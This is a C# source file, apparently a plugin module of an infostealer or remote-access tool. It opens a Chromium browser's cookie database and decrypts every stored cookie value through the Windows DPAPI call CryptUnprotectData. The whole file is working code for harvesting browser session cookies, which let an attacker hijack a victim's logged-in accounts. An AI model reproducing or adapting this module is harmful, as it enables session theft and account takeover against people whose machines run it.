using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Plugin.Browsers.Chromium;

namespace Plugin.Browsers.Chromium
{
    public class ChromiumCookies
    {

        public class ChromiumCookie
        {
            public string Host { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
            public string EncValue { get; set; }
            public string Path { get; set; }
            public DateTime ExpiresUTC { get; set; }
            public bool Secure { get; set; }
            public bool HttpOnly { get; set; }
            public bool Expired { get; set; }

            public override string ToString()
            {
                return string.Format("Host: {1}{0}Name: {2}{0}Value: {8}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure, EncValue);
            }
        }

        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }
        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long)span.TotalSeconds;
        }


        public static List<ChromiumCookie> Cookies(string FileCookie)
        {
            
            List<ChromiumCookie> data = new List<ChromiumCookie>();
            SQLiteHandler sql = new SQLiteHandler(FileCookie);
            //if (!sql.ReadTable("cookies"))
                //MessageBox.Show("Could not read Cookie Table");

            int totalEntries = sql.GetRowCount();
            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    string h = sql.GetValue(i, "host_key");
                    //Uri host = new Uri(h);
                    string name = sql.GetValue(i, "name");
                    string encval = sql.GetValue(i, "encrypted_value");
                    string val = Decrypt(Encoding.Default.GetBytes(encval));
                    string valu = sql.GetValue(i, "value");
                    string path = sql.GetValue(i, "path");


                    bool secure = sql.GetValue(i, "is_secure") == "0" ? false : true;
                    bool http = sql.GetValue(i, "is_httponly") == "0" ? false : true;

                    // if this fails we're in deep shit
                    long expiryTime = long.Parse(sql.GetValue(i, "expires_utc"));
                    long currentTime = ToUnixTime(DateTime.Now);
                    long convertedTime = (expiryTime - 11644473600000000) / 1000000;//divide by 1000000 because we are going to add Seconds on to the base date
                    DateTime date = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                    date = date.AddSeconds(convertedTime);

                    DateTime exp = FromUnixTime(convertedTime);
                    bool expired = currentTime > convertedTime;



                    data.Add(new ChromiumCookie()
                    {
                        Host = h,
                        ExpiresUTC = exp,
                        Expired = expired,
                        Name = name,
                        EncValue = val,
                        Value = valu,
                        Path = path,
                        Secure = secure,
                        HttpOnly = http
                    });
                }
                catch (Exception)
                {
                    return data;
                }
            }
            return data;
        }


        private static string Decrypt(byte[] Datas)
        {
            string result;
            try
            {
                DATA_BLOB data_BLOB = default(DATA_BLOB);
                DATA_BLOB data_BLOB2 = default(DATA_BLOB);
                GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
               DATA_BLOB data_BLOB3;
                data_BLOB3.pbData = gchandle.AddrOfPinnedObject();
                data_BLOB3.cbData = Datas.Length;
                gchandle.Free();
               CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
                string empty = string.Empty;
               CryptUnprotectData(ref data_BLOB3, null, ref data_BLOB2, (IntPtr)0, ref cryptprotect_PROMPTSTRUCT, (CryptProtectFlags)0, ref data_BLOB);
                byte[] array = new byte[data_BLOB.cbData + 1];
                Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData);
                string @string = Encoding.UTF8.GetString(array);
                result = @string.Substring(0, @string.Length - 1);
            }
            catch
            {
                result = "";
            }
            return result;
        }
        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptProtectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, CryptProtectFlags dwFlags, ref DATA_BLOB pDataOut);

        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, CryptProtectFlags dwFlags, ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;

            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;

            public CryptProtectPromptFlags dwPromptFlags;

            public IntPtr hwndApp;

            public string szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2
        }

        [Flags]
        private enum CryptProtectFlags
        {
            CRYPTPROTECT_UI_FORBIDDEN = 1,
            CRYPTPROTECT_LOCAL_MACHINE = 4,
            CRYPTPROTECT_CRED_SYNC = 8,
            CRYPTPROTECT_AUDIT = 16,
            CRYPTPROTECT_NO_RECOVERY = 32,
            CRYPTPROTECT_VERIFY_PROTECTION = 64
        }

    }
}
